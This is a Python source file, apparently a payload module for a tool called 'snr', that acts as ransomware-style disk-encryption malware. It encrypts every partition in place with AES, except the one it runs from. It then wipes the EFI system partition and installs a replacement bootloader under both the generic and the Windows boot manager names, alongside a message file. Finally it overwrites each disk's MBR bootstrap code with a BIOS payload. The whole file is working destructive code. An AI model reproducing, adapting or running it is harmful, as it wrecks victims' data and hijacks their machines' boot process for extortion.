"""
"""

import os
import shutil

from Crypto.Cipher import AES

from snr.core.payload import context, entry_point, storage
from snr.core.util import common_utils, programs

KEY = "@KEY@".encode()
IV = "@IV@".encode()
MESSAGE = "@MESSAGE@"

FS_MOUNTPOINT = "/mnt"
EFI_DIRECTORY = f"{FS_MOUNTPOINT}/EFI"


def encrypt_device(info: storage.BlockInfo) -> None:
    common_utils.print_info(
        f"Encrypting {info.uuid}... (0/{info.size})", end="")
    aes = AES.new(KEY, AES.MODE_CBC, IV)
    with open(info.path, "r+b") as stream:
        encrypted_size = 0
        while encrypted_size < info.size:
            data = aes.encrypt(stream.read(AES.block_size))
            stream.seek(encrypted_size)
            stream.write(data)
            encrypted_size += AES.block_size
            common_utils.print_info(
                f"\rEncrypting {info.uuid}... ({encrypted_size}/{info.size})", end="")
    common_utils.print_info(
        f"\rEncrypting {info.uuid}... ({encrypted_size}/{info.size}: Done)")


@entry_point.entry_point
def main() -> None:
    block_info = storage.query_all_block_info()
    # We don't care about LVM
    common_utils.print_info("Disk_encryption payload started")
    ctx = context.create_context_for_mount_point("/")
    if ctx is None:
        common_utils.print_error("Creating context for / failed")
        return None

    our_device = storage.get_partition_root(ctx.device_name, block_info)
    if our_device is None:
        common_utils.print_error("Finding partition root device for / failed")
        return None

    with open("/root/bios_disk_encryption_message.bin", "rb") as stream:
        bios_payload = stream.read()

    for device in block_info:
        if device != our_device:
            for child in device.children:
                # Mount it to see if it's the ESP or not
                errorcode = programs.Mount().invoke_and_wait(
                    None, child.path, FS_MOUNTPOINT)
                if errorcode != 0:
                    common_utils.print_info(
                        f"Failed to mount '{child.path}'! Assuming it's not the ESP")
                    # Encrypt it anyway, because, encrypting the ESP is better
                    # than not encrypting a possible data partition
                    encrypt_device(child)
                    continue
                if os.path.exists(EFI_DIRECTORY) and len(os.listdir(EFI_DIRECTORY)) != 0:
                    if not os.path.exists("/mnt/boot") and not os.path.exists("/mnt/Windows"):
                        common_utils.print_info("Installing to ESP")
                        shutil.rmtree(EFI_DIRECTORY)
                        os.makedirs(f"{EFI_DIRECTORY}/BOOT")
                        shutil.copy("/root/BOOTX64.EFI",
                                    f"{EFI_DIRECTORY}/BOOT/BOOTX64.EFI")
                        with open(f"{EFI_DIRECTORY}/BOOT/message.txt", "w",
                                  encoding="utf-8") as stream:
                            stream.write(MESSAGE)
                        os.mkdir(f"{EFI_DIRECTORY}/Microsoft")
                        shutil.copy("/root/BOOTX64.EFI",
                                    f"{EFI_DIRECTORY}/Microsoft/BOOTMGFW.EFI")
                        with open(f"{EFI_DIRECTORY}/Microsoft/message.txt", "w",
                                  encoding="utf-8") as stream:
                            stream.write(MESSAGE)
                        programs.Umount().invoke_and_wait(None, FS_MOUNTPOINT)
                        continue
                # Not the ESP
                programs.Umount().invoke_and_wait(None, FS_MOUNTPOINT)
                encrypt_device(child)
            # Overwrite MBR bootstrap area
            # But not the whole MBR for two reason:
            # 1. If there is going to be a recovery, this saves the partition table
            # 2. Help with EFI boot if it is a UEFI device
            with open(device.path, "r+b") as stream:
                stream.write(bios_payload)
                # Mark it bootable, as the original flag is now encrypted
                stream.seek(510)
                stream.write(b"\x55\xAA")

    common_utils.print_ok("Disk_encryption payload completed")
    return None


if __name__ == "__main__":
    main()
